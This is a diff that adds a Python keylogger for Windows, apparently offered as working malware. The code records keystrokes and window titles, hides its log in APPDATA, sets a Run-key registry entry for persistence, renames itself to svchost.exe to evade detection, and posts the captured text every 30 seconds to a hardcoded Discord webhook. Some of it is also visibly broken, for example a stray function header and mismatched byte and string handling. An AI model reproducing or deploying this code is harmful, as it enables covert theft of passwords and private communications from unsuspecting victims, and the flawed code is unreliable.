@@ -1,0 +1,111 @@
+
+def start_keylogger():
+    import keyboard
+import os
+import sys
+import threading
+import requests
+import time
+from cryptography.fernet import Fernet
+import subprocess
+import winreg as reg  # For persistence (Windows)
+
+# === CONFIGURATION ===
+WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1453017137559109732/fcjjj13cKDKQAizXqrYPc1Iqvo9TwcqEthdgEY_MThPFi0_8RiU0YQWTHNk61u8vlijo'  # Your webhook here
+ENCRYPTION_KEY = Fernet.generate_key()
+cipher = Fernet(ENCRYPTION_KEY)
+LOG_FILE = os.getenv('APPDATA') + '\\SystemCache\\cache.dat'
+MAX_LOG_SIZE = 50000  # Characters before sending
+
+# === STEP 1: STEALTH & PERSISTENCE ===
+def add_to_startup():
+    try:
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        app_name = "WindowsSystemCache"
+        script_path = os.path.abspath(sys.argv[0])
+        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
+        reg.SetValueEx(key, app_name, 0, reg.REG_SZ, script_path)
+        reg.CloseKey(key)
+    except Exception as e:
+        pass
+
+# === STEP 2: ENCRYPTED LOGGING ===
+def write_to_log(data):
+    try:
+        encrypted_data = cipher.encrypt(data.encode())
+        with open(LOG_FILE, 'ab') as f:
+            f.write(encrypted_data + b'\n')
+    except:
+        pass
+
+# === STEP 3: CAPTURE KEYS & CONTEXT ===
+buffer = []
+window_name = ""
+
+def get_active_window():
+    try:
+        import win32gui
+        window = win32gui.GetForegroundWindow()
+        return win32gui.GetWindowText(window)
+    except:
+        return "Unknown"
+
+def on_key(event):
+    global buffer, window_name
+    current_window = get_active_window()
+    if current_window != window_name:
+        window_name = current_window
+        write_to_log(f"\n[Window: {window_name}]\n".encode())
+
+    key_name = event.name
+    if len(key_name) > 1:
+        key_name = f' [{key_name.upper()}] '
+    buffer.append(key_name)
+
+    if len(buffer) >= 30 or key_name in ['enter', 'space']:
+        log_entry = ''.join(buffer)
+        write_to_log(log_entry)
+        buffer.clear()
+
+# === STEP 4: DATA EXFILTRATION ===
+def send_logs():
+    while True:
+        time.sleep(30)
+        try:
+            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
+                with open(LOG_FILE, 'rb') as f:
+                    encrypted_logs = f.read()
+                if encrypted_logs:
+                    # Decrypt for transmission (or send encrypted)
+                    decrypted_packets = cipher.decrypt(encrypted_logs).decode(errors='ignore')
+                    payload = {'content': f'```{decrypted_packets[:1900]}```'}
+                    requests.post(WEBHOOK_URL, data=payload, timeout=5)
+                os.remove(LOG_FILE)  # Clear log after sending
+        except:
+            pass
+
+# === STEP 5: ANTI-DETECTION ===
+def mimic_process():
+    try:
+        # Disguise as a common process
+        base_name = os.path.basename(sys.argv[0]).lower()
+        if base_name != "svchost.exe":
+            os.rename(sys.argv[0], os.path.join(os.path.dirname(sys.argv[0]), "svchost.exe"))
+    except:
+        pass
+
+# === STEP 6: EXECUTION ===
+if __name__ == "__main__":
+    mimic_process()
+    add_to_startup()
+    keyboard.on_release(callback=on_key)
+
+    # Start exfiltration thread
+    exfil_thread = threading.Thread(target=send_logs, daemon=True)
+    exfil_thread.start()
+
+    # Keep script running
+    try:
+        keyboard.wait()
+    except KeyboardInterrupt:
+        sys.exit(0)
